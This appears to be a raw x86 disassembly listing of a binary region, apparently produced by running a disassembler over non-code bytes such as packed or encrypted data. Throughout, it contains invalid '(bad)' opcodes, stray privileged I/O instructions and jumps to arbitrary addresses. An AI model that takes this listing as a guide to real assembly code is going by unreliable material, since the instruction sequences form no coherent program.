  42d17f:	sbb    al,0x1c
  42d181:	mov    cl,0xd9
  42d183:	stos   BYTE PTR es:[edi],al
  42d184:	movsx  eax,BYTE PTR [esi-0x6c]
  42d188:	mov    al,ds:0xc817cf2c
  42d18d:	shr    BYTE PTR [edi+0x8],0x6d
  42d191:	jle    0x42d120
  42d193:	std    
  42d194:	je     0x42d1cb
  42d196:	xlat   BYTE PTR ds:[ebx]
  42d197:	dec    esp
  42d198:	mov    ebp,0x7e7c70c6
  42d19d:	and    dl,ah
  42d19f:	test   DWORD PTR [esi],edi
  42d1a1:	cli    
  42d1a2:	cmc    
  42d1a3:	push   ds
  42d1a4:	daa    
  42d1a5:	pop    ds
  42d1a6:	invd   
  42d1a8:	aas    
  42d1a9:	je     0x42d206
  42d1ab:	pop    ds
  42d1ac:	shl    DWORD PTR [ebp+0x66119aa4],cl
  42d1b2:	mov    ebp,0x46e168b
  42d1b7:	gs out 0xc8,al
  42d1ba:	mov    ah,0x79
  42d1bc:	sbb    bh,dh
  42d1be:	sahf   
  42d1bf:	mov    ch,0x13
  42d1c1:	pop    eax
  42d1c2:	cmp    edi,DWORD PTR [esi-0x32d2cbc7]
  42d1c8:	push   0x9f51af2c
  42d1cd:	inc    ebp
  42d1ce:	aaa    
  42d1cf:	push   edx
  42d1d0:	mov    cl,0x4f
  42d1d2:	pop    ebx
  42d1d3:	dec    edi
  42d1d4:	xchg   edx,eax
  42d1d5:	jae    0x42d1c1
  42d1d7:	inc    esp
  42d1d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1d9:	jno    0x42d256
  42d1db:	lahf   
  42d1dc:	sbb    BYTE PTR [esi],0x88
  42d1df:	xchg   edx,eax
  42d1e0:	jle    0x42d1a7
  42d1e2:	add    al,0xe5
  42d1e4:	js     0x42d23a
  42d1e6:	out    dx,al
  42d1e7:	mov    esp,0xce8cf604
  42d1ec:	sub    edi,ecx
  42d1ee:	sub    BYTE PTR [edi-0x4547bcd4],bh
  42d1f4:	push   ss
  42d1f5:	(bad)  
  42d1f6:	cld    
  42d1f7:	lock je 0x42d237
  42d1fa:	scas   eax,DWORD PTR es:[edi]
  42d1fb:	enter  0x55df,0xad
  42d1ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d200:	cmp    al,0xca
  42d202:	mov    ebp,0x6f308931
  42d207:	sti    
  42d208:	lahf   
  42d209:	das    
  42d20a:	arpl   ax,si
  42d20c:	or     DWORD PTR ds:0x86e0e4c,ecx
  42d212:	shr    DWORD PTR [ebp-0x69],1
  42d215:	(bad)  
  42d216:	jo     0x42d28d
  42d218:	je     0x42d239
  42d21a:	push   edx
  42d21b:	call   0x67da:0xca4f7ff0
  42d222:	iret   
  42d223:	loope  0x42d1d2
  42d225:	sti    
  42d226:	push   ebx
  42d227:	and    eax,0xfd1f61d9
  42d22c:	aam    0x6a
  42d22e:	cld    
  42d22f:	push   ebp
  42d230:	rol    DWORD PTR ds:[edx],1
  42d233:	and    esi,esi
  42d235:	mov    edi,0x5455896c
  42d23a:	dec    esi
  42d23b:	inc    edx
  42d23c:	or     al,0x4f
  42d23e:	inc    edi
  42d23f:	cdq    
  42d240:	lea    eax,[eax]
	...
  42d2b2:	add    BYTE PTR [eax],al
  42d2b4:	out    0xf,al
  42d2b6:	fldcw  WORD PTR [ebp-0x7]
  42d2b9:	push   esi
  42d2bb:	(bad)  
  42d2bc:	xchg   ebp,eax
  42d2bd:	fsubr  DWORD PTR [esi-0x16]
  42d2c0:	repnz sub BYTE PTR [ebx+edi*1+0x1dd6b],dh
  42d2c8:	cmc    
  42d2c9:	add    BYTE PTR [eax],al
  42d2cb:	add    ah,ch
  42d2cd:	cmp    bl,cl
  42d2cf:	and    BYTE PTR [edi+0x819ac02],al
  42d2d5:	pushf  
  42d2d6:	loop   0x42d2f6
  42d2d8:	sbb    BYTE PTR [ecx],ah
  42d2da:	dec    edi
  42d2db:	adc    cl,cl
  42d2dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d2de:	pushf  
  42d2df:	mov    edx,0x25855eb8
  42d2e4:	mov    DWORD PTR [esi-0x66],esp
  42d2e7:	neg    DWORD PTR [ecx]
  42d2e9:	xor    dl,BYTE PTR ds:0x39231b29
  42d2ef:	call   0xe34776d4
  42d2f4:	in     eax,dx
  42d2f5:	and    eax,0x2d45fa9e
  42d2fa:	fwait
  42d2fb:	ja     0x913ce7ed
  42d301:	add    al,0x8f
  42d303:	(bad)  
  42d305:	idiv   BYTE PTR [ebx]
  42d307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d308:	sbb    edi,ebx
  42d30a:	sti    
  42d30b:	out    0x70,al
  42d30d:	cmp    eax,0xdd856c3e
  42d312:	mov    eax,ebx
  42d314:	jbe    0x42d354
  42d316:	xchg   ecx,eax
  42d317:	inc    edx
  42d318:	push   eax
  42d319:	xor    DWORD PTR [edx],edi
  42d31b:	ins    BYTE PTR es:[edi],dx
  42d31c:	xor    esp,esp
  42d31e:	and    esi,DWORD PTR [esi-0x1ffb5cdf]
  42d324:	mov    cl,0xef
  42d326:	adc    eax,0xf2624eaa
  42d32b:	push   0xf903bc74
  42d330:	imul   DWORD PTR [edx-0x6e]
  42d333:	sub    DWORD PTR [eax],edx
  42d335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d336:	lds    ebp,FWORD PTR [ecx-0x64]
  42d339:	dec    eax
  42d33a:	and    bl,al
  42d33c:	jo     0x42d2d7
  42d33e:	pop    ecx
  42d33f:	push   edi
  42d340:	out    0x93,al
  42d342:	add    eax,0xdd5801a4
  42d347:	daa    
  42d348:	jg     0x42d374
  42d34a:	xchg   bl,al
  42d34c:	xlat   BYTE PTR ds:[ebx]
  42d34d:	repnz loop 0x42d366
  42d350:	(bad)  
  42d351:	inc    ebp
  42d352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d353:	mov    ebp,0xe16ffc7d
  42d358:	sbb    dh,dl
  42d35a:	push   esp
  42d35b:	das    
  42d35c:	mov    edi,0xf0c6b91a
  42d361:	(bad)  
  42d362:	cmp    eax,0xd30292dc
  42d367:	and    BYTE PTR ds:0x1055adde,cl
  42d36d:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42d36f:	ror    BYTE PTR [edi],1
  42d371:	loope  0x42d3d7
  42d373:	(bad)  
  42d374:	std    
  42d375:	mov    edi,0xd6c073ad
  42d37a:	adc    al,0xab
  42d37c:	mov    ds:0x499d2d83,eax
  42d381:	data16 repz mov gs:0x383b6309,al
  42d389:	mul    ecx
  42d38b:	(bad)  
  42d38c:	out    dx,al
  42d38d:	mov    al,ds:0x5a7269f8
  42d392:	add    DWORD PTR [edx-0x53cfefdf],ebx
  42d398:	push   es
  42d399:	repnz adc dh,BYTE PTR [ebx]
  42d39c:	pop    esp
  42d39d:	jecxz  0x42d361
  42d39f:	mov    edi,DWORD PTR [ecx]
  42d3a1:	mov    ebx,0x13ad85cd
  42d3a6:	sub    al,0x44
  42d3a8:	push   0xfffffffc
  42d3aa:	or     edx,DWORD PTR [ebx+0xe]
  42d3ad:	jae    0x42d3b8
  42d3af:	aam    0xd9
  42d3b1:	loope  0x42d40e
  42d3b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d3b4:	test   eax,0x31f846c6
  42d3b9:	cwde   
  42d3ba:	sub    al,0x1
  42d3bc:	ret    
  42d3bd:	ja     0x42d3a9
  42d3bf:	dec    eax
  42d3c0:	push   0x0
	...
  42d432:	add    BYTE PTR [eax],al
  42d434:	in     al,dx
  42d435:	sbb    ebp,edx
  42d437:	sahf   
  42d438:	cmc    
  42d439:	fsubp  st(7),st
  42d43b:	jnp    0x42d48c
  42d43d:	mov    al,ds:0xd16d0781
  42d442:	inc    ecx
  42d443:	inc    esp
  42d444:	pusha  
  42d445:	fiadd  WORD PTR [ecx]
  42d447:	add    ch,dh
  42d449:	add    BYTE PTR [eax],al
  42d44b:	add    BYTE PTR [ecx-0x7e],ch
  42d44e:	push   ss
  42d44f:	(bad)  
  42d450:	mov    esp,DWORD PTR [edx+0x39a0970]
  42d456:	es xchg edx,eax
  42d458:	out    dx,al
  42d459:	out    dx,eax
  42d45a:	sti    
  42d45b:	inc    eax
  42d45c:	jp     0x42d470
  42d45e:	dec    DWORD PTR [ebx-0x67]
  42d461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d462:	mov    ebx,0x2e04616f
  42d467:	stos   BYTE PTR es:[edi],al
  42d468:	je     0x42d465
  42d46a:	aaa    
  42d46b:	cdq    
  42d46c:	in     al,dx
  42d46d:	sar    bl,cl
  42d46f:	push   0x4e91aaa
  42d474:	call   0xb48264c2
  42d479:	xlat   BYTE PTR ds:[ebx]
  42d47a:	xor    al,0x60
  42d47c:	adc    al,al
  42d47e:	jns    0x42d4ff
  42d480:	sub    esi,DWORD PTR [edi+0x2682e21]
  42d486:	jmp    0x9187:0x6953a2c3
  42d48d:	out    dx,al
  42d48e:	call   0xa0d03fd4
  42d493:	in     al,dx
  42d494:	adc    al,0xb2
  42d496:	repnz shl DWORD PTR [ebx+esi*1+0x2f9c3f0e],1
  42d49e:	cli    
  42d49f:	ds loope 0x42d4bb
  42d4a2:	pushf  
  42d4a3:	jo     0x42d4cc
  42d4a5:	enter  0x7dd6,0xf
  42d4a9:	jnp    0x42d486
  42d4ab:	jmp    0x689e7905
  42d4b0:	arpl   WORD PTR [ebx],dx
  42d4b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d4b3:	inc    ecx
  42d4b4:	mov    esi,0xda0d0338
  42d4b9:	jecxz  0x42d4ea
  42d4bb:	test   eax,0x9a34f4cf
  42d4c0:	inc    ecx
  42d4c1:	and    DWORD PTR [ebp+0x7289d9d2],ebx
  42d4c7:	jge    0x42d482
  42d4c9:	dec    ebp
  42d4ca:	bound  ebx,QWORD PTR [edx-0x2b]
  42d4cd:	xchg   esp,eax
  42d4ce:	test   al,0x26
  42d4d0:	in     eax,dx
  42d4d1:	popa   
  42d4d2:	xchg   eax,esp
  42d4d4:	xchg   ebx,eax
  42d4d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d4d6:	adc    edi,ecx
  42d4d8:	mov    dl,0x6c
  42d4da:	push   ebp
  42d4db:	add    eax,0x81ddc6b6
  42d4e0:	pushf  
  42d4e1:	mov    DWORD PTR [edx],edi
  42d4e3:	mov    eax,ds:0xea0c7d47
  42d4e8:	loope  0x42d4df
  42d4ea:	push   esp
  42d4eb:	sub    eax,0x166590fd
  42d4f0:	dec    eax
  42d4f1:	js     0x42d51c
  42d4f3:	mov    ?,WORD PTR [esi+esi*4+0x21]
  42d4f7:	xor    dl,ch
  42d4f9:	in     eax,dx
  42d4fa:	adc    ah,BYTE PTR [edi-0x7e]
  42d4fd:	call   0x5b37af4f
  42d502:	cmp    eax,0xdff26b28
  42d507:	push   0x53
  42d509:	sbb    ecx,ebx
  42d50b:	test   al,0x6c
  42d50d:	mov    gs,eax
  42d50f:	mov    ds:0xe1717289,al
  42d514:	js     0x42d4ba
  42d516:	pop    ecx
  42d517:	mov    ah,0x96
  42d519:	arpl   sp,si
  42d51b:	jae    0x42d4f6
  42d51d:	lea    edx,[ecx]
  42d51f:	gs inc edi
  42d521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d522:	inc    eax
  42d523:	popa   
  42d524:	jae    0x42d4ed
  42d526:	in     eax,dx
  42d527:	out    dx,al
  42d528:	fisubr WORD PTR [ebx-0x286bceb5]
  42d52e:	loop   0x42d4c9
  42d530:	dec    ebx
  42d531:	jle    0x42d528
  42d533:	pusha  
  42d534:	inc    esi
  42d535:	lock xor eax,DWORD PTR [esi-0x1c]
  42d539:	dec    esp
  42d53a:	aad    0xb
  42d53c:	xor    esp,esi
  42d53e:	test   DWORD PTR [eax+ecx*1],edx
	...
  42d5b1:	add    BYTE PTR [eax],al
  42d5b3:	add    BYTE PTR [ebp+0x48],bl
  42d5b6:	jle    0x42d546
  42d5b8:	jg     0x42d578
  42d5ba:	std    
  42d5bb:	fld    TBYTE PTR [edi]
  42d5bd:	cmp    BYTE PTR [ebp-0x50],bl
  42d5c0:	rol    BYTE PTR [edi-0x20aa8070],1
  42d5c6:	add    DWORD PTR [eax],eax
  42d5c8:	cmc    
  42d5c9:	add    BYTE PTR [eax],al
  42d5cb:	add    BYTE PTR [esp+ebx*2],bl
  42d5ce:	xchg   edx,eax
  42d5cf:	sbb    al,0xb8
  42d5d1:	xor    bl,BYTE PTR [edi]
  42d5d3:	cdq    
  42d5d4:	mov    al,0xa9
  42d5d6:	call   0x3dd98cc7
  42d5db:	fwait
  42d5dc:	ror    BYTE PTR [ebp+0x75114ec3],1
  42d5e2:	sbb    BYTE PTR [edx],bl
  42d5e4:	push   es
  42d5e5:	or     BYTE PTR [edi],dl
  42d5e7:	(bad)  
  42d5e9:	and    dh,BYTE PTR [esi+edi*2+0x6b14361f]
  42d5f0:	inc    edi
  42d5f1:	push   ebp
  42d5f2:	push   edx
  42d5f3:	mov    DWORD PTR [edx+0x7f29deb3],eax
  42d5f9:	or     bl,dh
  42d5fb:	mov    ch,0xf4
  42d5fd:	xor    al,ch
  42d5ff:	or     al,BYTE PTR [ebp+0x6c4ac4a3]
  42d605:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  42d607:	jno    0x42d658
  42d609:	and    DWORD PTR [eax-0x58e6be9f],eax
  42d60f:	add    eax,0xc0cd1981
  42d614:	mov    ch,BYTE PTR [ecx-0x7a]
  42d617:	ds inc edi
  42d619:	ins    BYTE PTR es:[edi],dx
  42d61a:	adc    DWORD PTR [ecx-0x2805d9fa],eax
  42d620:	jnp    0x42d5b5
  42d622:	ret    
  42d623:	mov    BYTE PTR [ebx+0x14],bl
  42d626:	mov    eax,DWORD PTR [edx-0x5b]
  42d629:	xchg   BYTE PTR [edi],cl
  42d62b:	pusha  
  42d62c:	shr    BYTE PTR ds:0xe4483b42,cl
  42d632:	sbb    ebx,DWORD PTR [esi+0xb]
  42d635:	push   esi
  42d636:	xchg   esi,eax
  42d637:	dec    eax
  42d638:	and    cl,dl
  42d63a:	stos   DWORD PTR es:[edi],eax
  42d63b:	lea    eax,[ebx-0x66125a60]
  42d641:	adc    al,0xb0
  42d643:	fistp  QWORD PTR [ebx+0x398427aa]
  42d649:	mov    ebx,0x92c49735
  42d64e:	jnp    0x42d61c
  42d650:	push   edi
  42d651:	hlt    
  42d652:	pop    ss
  42d653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d654:	in     eax,dx
  42d655:	hlt    
  42d656:	lock mov WORD PTR [edx+ebx*1],?
  42d65a:	les    esi,FWORD PTR es:[esi-0xd08e35f]
  42d661:	or     edi,DWORD PTR [edx+0x45]
  42d664:	repnz cmc 
  42d666:	sbb    al,0x1e
  42d668:	inc    edi
  42d669:	outs   dx,DWORD PTR ds:[esi]
  42d66a:	retf   
  42d66b:	xor    eax,0x9d06f511
  42d670:	jge    0x42d6d8
  42d672:	(bad)  [ebx]
  42d674:	or     al,0x8e
  42d676:	xor    al,cl
  42d678:	adc    DWORD PTR [ebx-0x7c0e7537],ebp
  42d67e:	int3   
  42d67f:	push   ebx
  42d680:	in     al,0x6c
  42d682:	in     eax,0x7a
  42d684:	nop
  42d685:	test   BYTE PTR [ebp+eax*2+0x21],ah
  42d689:	cmp    ch,BYTE PTR [ecx]
  42d68b:	xchg   DWORD PTR [ebp-0x650f0fee],esp
  42d691:	xor    bh,bl
  42d693:	pop    es
  42d694:	adc    eax,0x223b9bd
  42d699:	or     esp,DWORD PTR [edx]
  42d69b:	pop    ebx
  42d69c:	(bad)  
  42d69d:	cmp    edi,DWORD PTR [eax+0xc4baa80]
  42d6a3:	mov    al,0x91
  42d6a5:	mov    al,0x2
  42d6a7:	sahf   
  42d6a8:	inc    edi
  42d6a9:	mov    bl,0x88
  42d6ab:	or     eax,0xb827251f
  42d6b0:	jb     0x42d673
  42d6b2:	rep stos BYTE PTR es:[edi],al
  42d6b4:	push   ebp
  42d6b5:	sbb    BYTE PTR [ebx-0x35],bh
  42d6b8:	stos   BYTE PTR es:[edi],al
  42d6b9:	push   0x10
  42d6bb:	pop    ss
  42d6bc:	cmp    eax,0x7757a70d
	...
  42d731:	add    BYTE PTR [eax],al
  42d733:	add    BYTE PTR [eax],bh
  42d735:	mov    DWORD PTR [edx-0x6b],ebp
  42d738:	sti    
  42d739:	idiv   edi
  42d73b:	lods   eax,DWORD PTR ds:[esi]
  42d73c:	jne    0x42d70c
  42d73e:	adc    al,0x87
  42d740:	cmp    al,0x75
  42d742:	add    dl,0x4a
  42d745:	loopne 0x42d748
  42d747:	add    ch,dh
  42d749:	add    BYTE PTR [eax],al
  42d74b:	add    al,ah
  42d74d:	add    eax,0x2c01cf43
  42d752:	sub    DWORD PTR [esp+esi*2-0x56],0xc0fdf9b1
  42d75a:	or     eax,0x7e77ef64
  42d75f:	inc    eax
  42d760:	(bad)  
  42d761:	jb     0x42d7cf
  42d763:	dec    esi
  42d764:	xchg   ch,dh
  42d766:	loopne 0x42d71e
  42d768:	push   esi
  42d769:	xlat   BYTE PTR ds:[ebx]
  42d76a:	repz mov ds:0x547ea01c,al
  42d770:	aad    0xa4
  42d772:	sti    
  42d773:	jge    0x42d7af
  42d775:	fisttp WORD PTR ds:0xb8437520
  42d77b:	mov    edx,0x6ea6392e
  42d780:	imul   ecx,DWORD PTR ds:0x8f6d15a,0xcbc5c425
  42d78a:	cmp    al,0x1c
  42d78c:	push   edx
  42d78d:	mov    esi,ss
  42d78f:	inc    ebx
  42d790:	xchg   BYTE PTR [edi+0x4b],bh
  42d793:	sbb    BYTE PTR [edx+0x4076971c],dh
  42d799:	fwait
  42d79a:	jmp    0x8269:0x6eb14c12
  42d7a1:	retf   
  42d7a2:	push   ss
  42d7a3:	pop    es
  42d7a4:	cmp    dh,BYTE PTR [ebx+0x51]
  42d7a7:	push   ebx
  42d7a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d7a9:	repz addr16 and eax,0x6dfa91e3
  42d7b0:	inc    ebx
  42d7b2:	arpl   si,cx
  42d7b4:	add    BYTE PTR [ebp+eax*2+0x5f],cl
  42d7b8:	fs inc ebp
  42d7ba:	lds    ebp,FWORD PTR [edi+ebp*2+0x2e]
  42d7be:	popf   
  42d7bf:	or     al,0x6e
  42d7c1:	into   
  42d7c2:	(bad)  
  42d7c4:	fld    DWORD PTR [edx]
  42d7c6:	jbe    0x42d7c3
  42d7c8:	ficomp WORD PTR [edx+ebx*1-0x5b]
  42d7cc:	pop    edx
  42d7cd:	or     al,0xea
  42d7cf:	xchg   BYTE PTR [ecx-0x193e3e0e],ch
  42d7d5:	imul   esp,esp,0x6af9305
  42d7db:	jae    0x42d82a
  42d7dd:	add    ah,ch
  42d7df:	push   0x4a
  42d7e1:	ins    BYTE PTR es:[edi],dx
  42d7e2:	mov    esi,ebx
  42d7e4:	xchg   edx,eax
  42d7e5:	push   edi
  42d7e6:	mov    bh,0x86
  42d7e8:	loop   0x42d843
  42d7ea:	cli    
  42d7eb:	dec    esp
  42d7ec:	stc    
  42d7ed:	jg     0x42d7a1
  42d7ef:	loopne 0x42d7a4
  42d7f1:	mov    edx,0x94f6a529
  42d7f6:	or     BYTE PTR [ecx-0x1c60b874],ah
  42d7fc:	sbb    dl,dh
  42d7fe:	adc    ecx,DWORD PTR [eax-0x5c0157e3]
  42d804:	pop    ebp
  42d805:	popf   
  42d806:	out    dx,eax
  42d807:	test   al,0x36
  42d809:	xor    al,0xf4
  42d80b:	in     al,0xef
  42d80d:	test   eax,0xc1e5a002
  42d812:	mov    dl,0xd9
  42d814:	mov    ds,WORD PTR [eax]
  42d816:	xor    DWORD PTR [esi],ebp
  42d818:	adc    al,0x82
  42d81a:	and    eax,0xff3a0409
  42d81f:	test   BYTE PTR [esi-0x520b3021],al
  42d825:	out    dx,eax
  42d826:	pop    esp
  42d827:	push   edx
  42d828:	fs mov ebp,0x941ddbb7
  42d82e:	and    BYTE PTR [edi-0x21],ah
  42d831:	jne    0x42d7df
  42d833:	imul   ebx,DWORD PTR [esp+edx*2],0x7a
  42d837:	jno    0x42d84d
  42d839:	loope  0x42d7e2
  42d83b:	scas   eax,DWORD PTR es:[edi]
  42d83c:	inc    eax
  42d83d:	ja     0x42d7d9
  42d83f:	int    0x40
	...
  42d8b1:	add    BYTE PTR [eax],al
  42d8b3:	add    BYTE PTR [eax],dl
  42d8b5:	sbb    ecx,ecx
  42d8b7:	jmp    0xfb73d487
  42d8bc:	mov    edx,0x8fdcc254
  42d8c1:	xor    al,0x70
  42d8c3:	pop    ebp
  42d8c4:	aas    
  42d8c5:	loope  0x42d8c8
  42d8c7:	add    ch,dh
  42d8c9:	add    BYTE PTR [eax],al
  42d8cb:	add    al,cl
  42d8cd:	call   0x5763:0xfa284b4c
  42d8d4:	out    dx,eax
  42d8d5:	icebp  
  42d8d6:	or     eax,0x2178bd0f
  42d8db:	lds    edx,FWORD PTR [edi-0x3adbe6a1]
  42d8e1:	ins    DWORD PTR es:[edi],dx
  42d8e2:	push   cs
  42d8e3:	test   edx,eax
  42d8e5:	mov    cl,0x24
  42d8e7:	sbb    eax,0x57a9f4e2
  42d8ec:	sbb    BYTE PTR [edx+0x7eec7644],al
  42d8f2:	loope  0x42d93a
  42d8f4:	retf   0x7b05
  42d8f7:	xor    dl,BYTE PTR [esi-0x5439cd0]
  42d8fd:	jnp    0x42d885
  42d8ff:	(bad)  
  42d900:	rcl    esp,1
  42d902:	pop    ds
  42d903:	lea    ebx,[edi+ebx*1-0x13c2c412]
  42d90a:	or     eax,0x1fd74ef0
  42d90f:	fwait
  42d910:	aas    
  42d911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d912:	(bad)  
  42d913:	jno    0x42d95b
  42d915:	mov    bl,BYTE PTR [esi]
  42d917:	aaa    
  42d918:	mov    eax,ds:0x7dd5c26f
  42d91d:	mov    bl,0x6b
  42d91f:	jns    0x42d8ae
  42d921:	dec    ecx
  42d922:	mov    dh,0xfa
  42d924:	xchg   esi,eax
  42d925:	push   esi
  42d926:	mov    al,0x33
  42d928:	inc    esi
  42d929:	adc    al,0x98
  42d92b:	loopne 0x42d8b3
  42d92d:	loop   0x42d926
  42d92f:	or     al,0x8d
  42d931:	sbb    bh,BYTE PTR [ecx-0x9a85af5]
  42d937:	mov    eax,0xcbbba8
  42d93c:	fisttp QWORD PTR [eax+0x5f]
  42d93f:	push   0x46
  42d941:	adc    BYTE PTR [ecx],ch
  42d943:	jb     0x42d94e
  42d945:	aad    0x62
  42d947:	or     BYTE PTR [edx+0x779bbee6],0x99
  42d94e:	aad    0xa7
  42d950:	inc    esp
  42d951:	pop    esp
  42d952:	(bad)  
  42d953:	mov    bl,BYTE PTR [eax-0x3bffefdc]
  42d959:	pop    ds
  42d95a:	mov    eax,ds:0x21d5313d
  42d95f:	adc    eax,edi
  42d961:	outs   dx,BYTE PTR ds:[esi]
  42d962:	lea    edi,[ecx+0x24]
  42d965:	mov    ebx,0xa918cacf
  42d96a:	cmp    BYTE PTR [edi+0x1cbe39a1],0x31
  42d971:	(bad)  
  42d972:	or     eax,0xce5d2fed
  42d977:	mov    WORD PTR [eax+eax*4+0x25],gs
  42d97b:	and    BYTE PTR [edi-0x13428be],al
  42d981:	cld    
  42d982:	jnp    0x42d9c6
  42d984:	cwde   
  42d985:	pop    edi
  42d986:	push   esi
  42d987:	ja     0x42d95e
  42d989:	inc    ebx
  42d98a:	fidivr WORD PTR [esi-0x754a2a41]
  42d990:	xchg   edx,eax
  42d991:	mov    ebp,0x2194f491
  42d996:	pop    ecx
  42d997:	clc    
  42d998:	push   ebp
  42d999:	or     cl,dl
  42d99b:	and    al,0x30
  42d99d:	lock repnz cs fwait
  42d9a1:	cdq    
  42d9a2:	stc    
  42d9a3:	hlt    
  42d9a4:	jnp    0x42d9ce
  42d9a6:	dec    ebp
  42d9a7:	push   eax
  42d9a8:	dec    ebp
  42d9a9:	popa   
  42d9aa:	sbb    al,0x3
  42d9ac:	(bad)
  42d9af:	pop    edi
  42d9b0:	call   0x31bcc36f
  42d9b5:	xchg   dh,cl
  42d9b7:	shl    DWORD PTR [ecx+0x7ba395c9],cl
  42d9bd:	dec    ebp
  42d9be:	test   BYTE PTR [edx],bl
  42d9c0:	push   eax
	...
  42da31:	add    BYTE PTR [eax],al
  42da33:	add    BYTE PTR [edi-0x2be7726],ah
  42da39:	push   ebx
  42da3a:	out    dx,eax
  42da3b:	(bad)  
  42da3c:	jp     0x42da02
  42da3e:	dec    edi
  42da3f:	(bad)  
  42da40:	mov    ch,0x81
  42da42:	inc    eax
  42da43:	int    0x34
  42da45:	loop   0x42da48
  42da47:	add    ch,dh
  42da49:	add    BYTE PTR [eax],al
  42da4b:	add    BYTE PTR [eax+0x510a54ce],dh
  42da51:	pop    ss
  42da52:	xor    al,0xb7
  42da54:	inc    esp
  42da55:	ret    
  42da56:	ret    
  42da57:	push   es
  42da58:	bound  edx,QWORD PTR [eax]
  42da5a:	sbb    DWORD PTR [ecx],0xffffffea
  42da5d:	leave  
  42da5e:	inc    esp
  42da5f:	pop    edi
  42da60:	sub    BYTE PTR [esi-0x31],dh
  42da63:	jmp    0x42da37
  42da65:	dec    ebx
  42da66:	and    DWORD PTR [esi+0x73],ecx
  42da69:	pop    esp
  42da6a:	inc    ebp
  42da6b:	xchg   ebx,eax
  42da6c:	sbb    ebp,DWORD PTR [ebp-0x1d]
  42da6f:	ins    DWORD PTR es:[edi],dx
  42da70:	imul   eax,DWORD PTR [edi+ebx*8+0x4415c0d8],0x7
  42da78:	xor    al,0xcf
  42da7a:	jo     0x42da65
  42da7c:	cmp    dl,ah
  42da7e:	call   0x722a7e64
  42da83:	call   0xb39b:0x4c2a59b1
  42da8a:	add    DWORD PTR [edx],edx
  42da8c:	jle    0x42da69
  42da8e:	inc    BYTE PTR [ebp-0x6f]
  42da91:	mov    ?,WORD PTR [ebx-0x237ac08e]
  42da97:	xlat   BYTE PTR ds:[ebx]
  42da98:	shl    DWORD PTR [edx+0x570760a3],1
  42da9e:	out    dx,eax
  42da9f:	inc    ebp
  42daa0:	or     bl,BYTE PTR [ebx+ecx*1-0x77]
  42daa4:	add    eax,0x279ef491
  42daa9:	sbb    al,0x21
  42daab:	push   ebp
  42daac:	imul   ecx,DWORD PTR [esi],0x4399bd6f
  42dab2:	cmp    eax,0x5df58615
  42dab7:	in     eax,dx
  42dab8:	outs   dx,DWORD PTR ds:[esi]
  42dab9:	mov    esi,0x282cd220
  42dabe:	loop   0x42daab
  42dac0:	fldcw  WORD PTR [edi+0x3c00f50b]
  42dac6:	out    0x7,al
  42dac8:	add    eax,0x18b2af04
  42dacd:	inc    edi
  42dace:	les    esi,FWORD PTR [ebp+esi*8-0x48556496]
  42dad5:	js     0x42db4f
  42dad7:	inc    eax
  42dad8:	ins    BYTE PTR es:[edi],dx
  42dad9:	mov    eax,ds:0x8d3081e1
  42dade:	(bad)  
  42dadf:	das    
  42dae0:	adc    eax,0x167c105c
  42dae5:	rcr    bh,1
  42dae7:	test   BYTE PTR [ebp-0x5e],bl
  42daea:	stos   BYTE PTR es:[edi],al
  42daeb:	inc    ebx
  42daec:	jno    0x42dabb
  42daee:	inc    esi
  42daef:	stc    
  42daf0:	xchg   edi,eax
  42daf1:	xor    dl,BYTE PTR [ebx]
  42daf3:	xchg   DWORD PTR [ebx],eax
  42daf5:	jp     0x42db03
  42daf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42daf8:	imul   ebp,DWORD PTR [edi+edx*8+0x4a4ecb8],0xffffffa1
  42db00:	daa    
  42db01:	fs imul eax
  42db04:	outs   dx,DWORD PTR ss:[esi]
  42db06:	cmp    BYTE PTR [ebx-0xb],ch
  42db09:	add    DWORD PTR [ecx+0x48],ebp
  42db0c:	pop    ds
  42db0d:	jmp    0x42daf1
  42db0f:	jbe    0x42da91
  42db11:	jnp    0x42db13
  42db13:	mov    eax,0x857ad473
  42db18:	mov    edi,0x527b7c18
  42db1d:	test   BYTE PTR [edi+0x2a],dl
  42db20:	loop   0x42dab9
  42db22:	push   cs
  42db23:	cs dec edx
  42db25:	push   es
  42db26:	xchg   BYTE PTR [esi],bh
  42db28:	cmp    dl,0xf9
  42db2b:	scas   al,BYTE PTR es:[edi]
  42db2c:	mov    bl,BYTE PTR [ecx+0x64]
  42db2f:	popa   
  42db30:	dec    ebx
  42db31:	jae    0x42dada
  42db33:	mov    ds:0xf25926c2,eax
  42db38:	lock ror DWORD PTR cs:[ecx+0x2c],1
  42db3d:	(bad)  
  42db3f:	xor    ecx,DWORD PTR [edi]
	...
  42dbb1:	add    BYTE PTR [eax],al
  42dbb3:	add    BYTE PTR [edi+0x2],bh
  42dbb6:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42dbba:	call   FWORD PTR [ebx]
  42dbbc:	(bad)  
  42dbbd:	mov    fs:0x9065f337,al
  42dbc3:	jmp    0xf5:0x1e329
  42dbca:	add    BYTE PTR [eax],al
  42dbcc:	adc    DWORD PTR [ebp+0x4d],ecx
  42dbcf:	rol    DWORD PTR gs:[ebp-0x6eac5f02],0x68
  42dbd7:	das    
  42dbd8:	mov    ah,0x3a
  42dbda:	jge    0x42dc51
  42dbdc:	xchg   edi,eax
  42dbdd:	into   
  42dbde:	mov    eax,0x2bd3fb81
  42dbe3:	popf   
  42dbe4:	mov    es,WORD PTR [ebp+0x2d]
  42dbe7:	(bad)  
  42dbe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbe9:	sub    ah,dh
